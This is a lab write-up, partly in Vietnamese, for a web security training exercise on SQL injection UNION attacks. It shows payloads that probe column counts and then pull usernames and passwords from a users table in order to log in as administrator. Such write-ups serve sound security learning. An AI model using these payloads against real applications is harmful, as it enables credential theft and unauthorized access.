# Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Overview:

Ở lab lần này, ta thực hiện UNION Attack vào lỗ hổng ở filter category để lấy được `username` và `password` 

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/231927391-27f2b311-0b6a-435b-a93d-86775e22985c.png)

# Solution

Bước đầu ta cần xác định số cột ở phần filter category trước

`'+UNION+SELECT+NULL,NULL--`

![image](https://user-images.githubusercontent.com/115911041/231928102-aecd466b-985b-4e75-8030-9d150bd72184.png)

Ta thấy có 2 collums. Tiếp theo đó, ta sử dụng UNION ATTACK với giá trị khác

`'+UNION+SELECT+'a','b'--`

![image](https://user-images.githubusercontent.com/115911041/231928436-3b07347b-262a-4a6f-9af3-0a3396b7c643.png)

Vậy là giờ ta có thể lấy được `username` và `password` rồi

`+UNION+SELECT+username,password+FROM+users--`

![image](https://user-images.githubusercontent.com/115911041/231929111-4e99eb40-0500-474b-9219-e97e765dabaa.png)

Theo đề bài ta cần log in là `administrator`

![image](https://user-images.githubusercontent.com/115911041/231928935-7ca985a8-e810-4de2-b022-068b431e405a.png)
